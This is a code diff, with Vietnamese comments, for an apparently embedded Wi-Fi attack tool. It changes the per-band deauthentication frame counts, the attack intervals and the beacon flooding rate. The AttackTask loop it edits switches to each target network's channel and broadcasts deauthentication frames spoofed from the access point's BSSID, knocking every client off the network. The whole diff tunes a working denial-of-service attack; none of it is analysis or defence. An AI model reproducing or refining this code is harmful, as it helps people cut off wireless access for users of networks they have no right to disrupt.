@@ -76,13 +76,15 @@ uint8_t deauth_bssid[6];
 const uint16_t DEFAULT_DEAUTH_REASON = 2;
 uint16_t deauth_reason = DEFAULT_DEAUTH_REASON;
 
-#define FRAMES_PER_DEAUTH 15    // số frame deauth gửi mỗi lần
-#define FRAMES_PER_BEACON 300   // số frame beacon gửi mỗi lần
+// Thay vì dùng hằng số chung, ta tách riêng số frame cho mỗi băng:
+#define FRAMES_PER_DEAUTH_24 5    // số frame deauth gửi cho băng 2.4GHz
+#define FRAMES_PER_DEAUTH_5  10    // số frame deauth gửi cho băng 5GHz
+#define FRAMES_PER_BEACON    200   // số frame beacon gửi mỗi lần
 
 // --------------------------------------------------
 // Các khoảng thời gian riêng cho tấn công từng băng (ms)
-const unsigned long ATTACK_INTERVAL_24 = 150;
-const unsigned long ATTACK_INTERVAL_5  = 10;
+const unsigned long ATTACK_INTERVAL_24 = 35;
+const unsigned long ATTACK_INTERVAL_5  = 90;
 unsigned long lastAttackTime24 = 0;
 unsigned long lastAttackTime5  = 0;
 static int currentTargetIndex24 = 0;
@@ -440,13 +442,14 @@ void AttackTask(void *pvParameters) {
   while (1) {
     if (currentState == STATE_ATTACK) {
       unsigned long now = millis();
+      
       // Xử lý cho băng 2.4GHz
       if (!attack_targets_24.empty() && (now - lastAttackTime24 >= ATTACK_INTERVAL_24)) {
         int idx = attack_targets_24[currentTargetIndex24];
         if (idx >= 0 && idx < (int)scan_results.size()) {
           wext_set_channel(WLAN0_NAME, scan_results[idx].channel);
           memcpy(deauth_bssid, scan_results[idx].bssid, 6);
-          for (int j = 0; j < FRAMES_PER_DEAUTH; j++) {
+          for (int j = 0; j < FRAMES_PER_DEAUTH_24; j++) {
             wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
             vTaskDelay(pdMS_TO_TICKS(5));
           }
@@ -455,13 +458,14 @@ void AttackTask(void *pvParameters) {
         currentTargetIndex24 = (currentTargetIndex24 + 1) % attack_targets_24.size();
         lastAttackTime24 = now;
       }
+      
       // Xử lý cho băng 5GHz
       if (!attack_targets_5.empty() && (now - lastAttackTime5 >= ATTACK_INTERVAL_5)) {
         int idx = attack_targets_5[currentTargetIndex5];
         if (idx >= 0 && idx < (int)scan_results.size()) {
           wext_set_channel(WLAN0_NAME, scan_results[idx].channel);
           memcpy(deauth_bssid, scan_results[idx].bssid, 6);
-          for (int j = 0; j < FRAMES_PER_DEAUTH; j++) {
+          for (int j = 0; j < FRAMES_PER_DEAUTH_5; j++) {
             wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
             vTaskDelay(pdMS_TO_TICKS(5));
           }
